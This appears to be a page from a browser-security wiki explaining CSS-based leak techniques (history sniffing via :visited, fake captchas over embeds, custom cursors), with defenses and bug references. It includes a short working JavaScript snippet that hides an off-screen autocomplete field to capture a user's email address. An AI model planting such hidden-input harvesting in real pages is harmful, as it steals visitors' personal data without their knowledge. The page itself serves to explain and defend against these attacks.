+++
title = "CSS Tricks"
description = ""
date = "2020-10-01"
category = [
    "Attack"
]
abuse = [
    "CSS"
]
defenses = [
    "Framing Protections"
]
menu = "main"
weight = 2
+++

## CSS Tricks
CSS can be used to trick a user into exposing information such as embedded pixel values by making visual changes that are affected by the embed.

## Getting history
A PoC of this attack can be found [^leak-1].  
Using the CSS [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited) selector, it’s possible to apply a different style for URLs that have been visited.  
Previously it was possible to use [`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) to detect this difference but now browsers prevent this. [^changes-1]   
So, it may be needed to trick the user into clicking an area that the CSS has affected this can be done using [`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode). [^blend-mode]   
Render timings have also been abused to do this without tricking the user. [^render-timings]  

## Evil Captcha
Using CSS, it’s possible to take an embed out of context.  
An example of this is pretending it’s a captcha. [^leak-2]
This can be prevented with XFO.

## Abusing autocomplete
If a website uses [autocomplete](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete) it may be possible to leak data such as email addresses.
This does require the user to be tricked into pressing the Up or Down arrow key then pressing Enter or Tab.
```javascript
let input = document.createElement("input");
input.type = "email";
input.autocomplete = "email";
input.name = "email";
input.size = "1";
input.style = "position:absolute;right:-500px;bottom:-21.9px";
input.onkeypress = e => {
    e.preventDefault();
}
window.onmousedown = e => {
    // ignore mouse clicks
    e.preventDefault();
}
input.onchange = e => {
    alert(e.srcElement.value);
    e.srcElement.value = "";
}
document.body.appendChild(input);
setInterval(() => {
    input.focus({preventScroll: true});
}, 1000);
```

## Custom cursor
Might not leak data directly but it may help trick the user.
```css
:root {
   cursor: url(URL), auto;            
}
```

## Defense
Some of the attacks can be prevented by using XFO,
The history attack can be prevented by disabling history or if on Firefox it’s possible to fix this by setting the `layout.css.visited_links_enabled` option in `about:config` to `false`.  
Number of bugs were reported about the issue: [^bug-1], [^bug-2], [^bug-3]
| [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                  [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                   |
| :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------: |
|                                         ❌                                          |                          ❌                          |                                 ✔️                                 |  |
## References
[^leak-1]: Whack a mole game, [link](https://lcamtuf.coredump.cx/whack/)  
[^changes-1]: Privacy and the :visited selector, [link](https://developer.mozilla.org/en-US/docs/Web/CSS/Privacy_and_the_:visited_selector)  
[^blend-mode]: CSS mix-blend-mode is bad for your browsing history, [link](https://lcamtuf.blogspot.com/2016/08/css-mix-blend-mode-is-bad-for-keeping.html)  
[^render-timings]: Pixel Perfect Timing Attacks with HTML5, [link](https://go.contextis.com/rs/140-OCV-459/images/Pixel_Perfect_Timing_Attacks_with_HTML5_Whitepaper%20%281%29.pdf)  
[^leak-2]: The Human Side Channel, [link](https://ronmasas.com/posts/the-human-side-channel)  
[^bug-1]: CSS :visited with mix-blend-mode can leak browser history, [link](https://bugs.chromium.org/p/chromium/issues/detail?id=712246)  
[^bug-2]: Eliminate :visited privacy issues once and for all, [link](https://bugs.chromium.org/p/chromium/issues/detail?id=713521)  
[^bug-3]: :visited support allows queries into global history, [link](https://bugzilla.mozilla.org/show_bug.cgi?id=147777)  

